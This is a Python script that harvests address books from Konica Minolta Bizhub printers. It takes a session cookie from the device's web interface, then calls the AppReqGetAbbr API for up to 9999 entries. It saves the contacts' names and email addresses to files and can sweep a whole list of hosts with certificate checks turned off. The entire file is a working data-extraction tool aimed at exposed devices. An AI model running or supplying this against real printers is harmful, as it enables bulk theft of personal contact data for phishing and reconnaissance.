#!/usr/bin/env python3
import argparse
import requests
import sys
import json
import os

# Suppress the "InsecureRequestWarning" about verify=False
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Minimal Bizhub address book fetch with optional debug output."
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--ip", help="Single IP or hostname.")
    group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")

    parser.add_argument(
        "-c", "--cookie",
        default=None,
        help="If you already have a valid 'ID=...' cookie, supply it here. Otherwise script auto-fetches."
    )
    parser.add_argument(
        "-n", "--names",
        action="store_true",
        help="If set, also dump the list of user names (in addition to emails)."
    )
    parser.add_argument(
        "-d", "--debug",
        action="store_true",
        help="Print debug info, including full responses and cookie details."
    )

    return parser.parse_args()

def auto_get_cookie(host, debug=False):
    """
    Perform a GET to https://<host>/wcd/index.html to retrieve the device's 'ID' cookie if it auto-assigns one.
    Return a requests.Session if successful, or None on failure.
    """
    url = f"https://{host}/wcd/index.html"
    session = requests.Session()
    try:
        r = session.get(url, verify=False, timeout=10)
        if debug:
            print(f"[DEBUG] GET {url} returned status {r.status_code}")
            print("[DEBUG] Response headers:\n", r.headers)
            print("[DEBUG] Response body:\n", r.text)
        
        r.raise_for_status()
        
        # Check if we got 'ID' in the cookie jar
        if "ID" in session.cookies:
            # Good: we presumably have a valid session cookie
            if debug:
                print("[DEBUG] Auto-fetched cookies in session:")
                for ck in session.cookies:
                    print("   ", ck.name, "=", ck.value)
            return session
        else:
            # The device didn't set an ID cookie
            if debug:
                print(f"[DEBUG] No 'ID' cookie returned from GET {url}. Session cookies:")
                for ck in session.cookies:
                    print("   ", ck.name, "=", ck.value)
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] Error auto-fetching cookie from {host}: {e}")
        return None

def fetch_address_book(host, cookie_value=None, session=None, debug=False):
    """
    POST to /wcd/api/AppReqGetAbbr with minimal data:
      - Only the ID=... cookie if we have it
      - The JSON body from Start=1 to End=9999
    Return the parsed JSON dict, or None on failure.
    """

    url = f"https://{host}/wcd/api/AppReqGetAbbr"

    # This JSON asks for up to 9999 entries, hoping to get everything in one shot.
    payload = (
        '{"AbbrListCondition":{"WellUse":"false","SearchKey":"None",'
        '"ObtainCondition":{"Type":"IndexList","IndexRange":{"Start":1,"End":9999}},'
        '"SortInfo":{"Condition":"No","Order":"Ascending"},"AddressKind":"Public","SearchSendMode":"0"}}'
    )

    # We'll store cookies in a dict if we have a cookie_value. 
    # If a session is provided, we'll rely on session.post(...) so it uses session.cookies.
    
    try:
        if session:
            # Use session cookies
            if debug:
                print("[DEBUG] Using auto-fetched session cookies. POSTing to", url)
            resp = session.post(url, data=payload, verify=False, timeout=15)
        else:
            cookie_dict = {}
            if cookie_value:
                # If the user gave "ID=xyz...", remove "ID=" prefix for requests
                if cookie_value.startswith("ID="):
                    cookie_value = cookie_value[3:]
                cookie_dict["ID"] = cookie_value.strip()
            
            if debug:
                print("[DEBUG] Using raw cookie dict:", cookie_dict)
                print("[DEBUG] POST", url, "with data:\n", payload)
            resp = requests.post(url, data=payload, cookies=cookie_dict, verify=False, timeout=15)

        if debug:
            print(f"[DEBUG] POST {url} returned status {resp.status_code}")
            print("[DEBUG] Response headers:\n", resp.headers)
            print("[DEBUG] Response body:\n", resp.text)

        if resp.status_code == 200:
            # Attempt to parse
            try:
                return resp.json()
            except json.JSONDecodeError:
                print(f"[!] Received HTTP 200 but invalid JSON from {host}.")
                print("    Partial response:", resp.text[:500])
                return None
        else:
            print(f"[!] Non-200 status from {host}: {resp.status_code}")
            print("    Partial response:", resp.text[:500])
            return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Error while fetching address book from {host}: {e}")
        return None

def extract_names_and_emails(data):
    """
    Extract Name and Email addresses from the JSON structure.
    Return (names_list, emails_list).
    """
    names, emails = [], []

    if not data:
        return names, emails

    # Typically the data is in data["AbbrList"]["Abbr"]
    abbr_list = None
    try:
        abbr_list = data["AbbrList"]["Abbr"]
    except (KeyError, TypeError):
        return names, emails

    for entry in abbr_list:
        name = entry.get("Name", "").strip()
        to_email = ""
        try:
            to_email = entry["SendConfiguration"]["AddressInfo"]["EmailMode"]["To"].strip()
        except (KeyError, AttributeError):
            pass

        if name:
            names.append(name)
        if to_email:
            emails.append(to_email)

    return names, emails

def process_host(host, cookie=None, dump_names=False, debug=False):
    """
    Handle the retrieval + parsing for a single host.
    """
    print(f"\n[*] Processing host: {host}")
    # If user didn't supply --cookie, try auto-get
    session = None
    cookie_value = None

    if cookie:
        # Use the user-supplied cookie
        cookie_value = cookie
        if debug:
            print(f"[DEBUG] Using user-supplied cookie: {cookie_value}")
    else:
        session = auto_get_cookie(host, debug=debug)
        if not session:
            print(f"[!] Could not retrieve an ID cookie automatically from {host}. Skipping.")
            return

    data = fetch_address_book(host, cookie_value=cookie_value, session=session, debug=debug)
    if not data:
        print(f"[!] No data returned for {host}.")
        return

    names, emails = extract_names_and_emails(data)
    unique_names = sorted(set(names))
    unique_emails = sorted(set(emails))

    if not unique_emails and not unique_names:
        print(f"    [!] Found no email addresses and no names.")
        return

    print(f"    Found {len(unique_names)} unique names.")
    print(f"    Found {len(unique_emails)} unique email addresses.")

    # If we found emails, write them
    if unique_emails:
        email_filename = f"bizhub-addrBk_emailAddr_{host}.txt"
        with open(email_filename, "w", encoding="utf-8") as f:
            for em in unique_emails:
                f.write(em + "\n")
        print(f"    -> Emails saved to: {email_filename}")

    # If user wants names and there are any
    if dump_names and unique_names:
        names_filename = f"bizhub-addrBk_names_{host}.txt"
        with open(names_filename, "w", encoding="utf-8") as f:
            for nm in unique_names:
                f.write(nm + "\n")
        print(f"    -> Names saved to: {names_filename}")

def main():
    args = parse_args()

    # Single IP
    if args.ip:
        process_host(args.ip, cookie=args.cookie, dump_names=args.names, debug=args.debug)
    
    # Multiple IPs in a file
    elif args.list:
        if not os.path.isfile(args.list):
            print(f"[!] The file {args.list} does not exist.")
            sys.exit(1)
        with open(args.list, "r", encoding="utf-8") as f:
            for line in f:
                host = line.strip()
                if not host:
                    continue
                process_host(host, cookie=args.cookie, dump_names=args.names, debug=args.debug)

if __name__ == "__main__":
    main()
